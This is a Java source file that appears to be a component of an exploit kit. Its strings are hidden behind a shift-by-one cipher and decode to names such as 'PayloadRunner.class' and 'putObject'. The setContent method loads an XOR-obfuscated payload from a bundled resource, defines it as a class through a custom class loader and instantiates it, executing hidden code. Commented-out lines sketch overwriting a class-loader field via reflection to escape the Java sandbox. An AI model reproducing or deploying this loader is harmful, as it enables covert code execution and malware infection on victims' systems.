package x;

import java.beans.Expression;
import java.beans.Statement;
import java.io.InputStream;
import java.io.Serializable;
import java.lang.reflect.Field;

public class H implements Serializable {

    private static final long serialVersionUID = 8652291142854519506L;

    public static H INSTANCE = null;
    
    public H() {
    	INSTANCE = this;
    }
    
    private Object content;

	public MCL mcl;
	
	public Object getContent() {
		return content;
	}

	public void setContent(Object content) {
		this.content = content;
     	new RuntimeException(x.Strings.dec("Dpoufou!tfu;!")+content).printStackTrace();    	
		
//	    Object bridge = content;
//	    Field myClassLoaderField;
		try {
//			myClassLoaderField = getClass().getField(x.Strings.dec("nzDmbttMpbefs"));
//		    Expression exp = new Expression(bridge,x.Strings.dec("pckfduGjfmePggtfu"),new Object[] {myClassLoaderField});
//		    long offset = (Long) exp.getValue();
//		    Statement stmt = new Statement(bridge,x.Strings.dec("qvuPckfdu"),
//		        new Object[] {this,offset,Thread.currentThread().getContextClassLoader()});
//		    stmt.execute();
//		    System.out.println(x.Strings.dec("NzDmbttMpbefs!jt!")+this.myClassLoader);
		    
		    boolean decodeNeeded = true;
            InputStream in = getClass().getResourceAsStream(x.Strings.dec("0y0qs"));
            if( in == null ) {
                in = getClass().getResourceAsStream(x.Strings.dec("0y0QbzmpbeSvoofs/dmbtt"));
                decodeNeeded = false; // Dev mode
            }
            byte[] bytes = new byte[100000];
            int bytesRead = in.read(bytes);
            if( decodeNeeded ) {
            	for( int i=0; i<bytes.length; i++ ) {
            		bytes[i] = (byte) (bytes[i] ^ 255); // Enought to hide
            	}
            }
            Class<?> cl = MCL.myDefineClass(mcl,bytes,0,bytesRead);
            @SuppressWarnings("unused")
			java.lang.Object o = cl.newInstance();
//            System.out.println(o.toString());
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
		
	public static Field getField() {
		try {
			return H.class.getDeclaredField(x.Strings.dec("ndm"));
		} catch (Exception e) {
			throw new RuntimeException(x.Strings.dec("Cboh"));
		}
	}
	
	public static ClassLoader getCCL() {
		return Thread.currentThread().getContextClassLoader();
	}
    
}
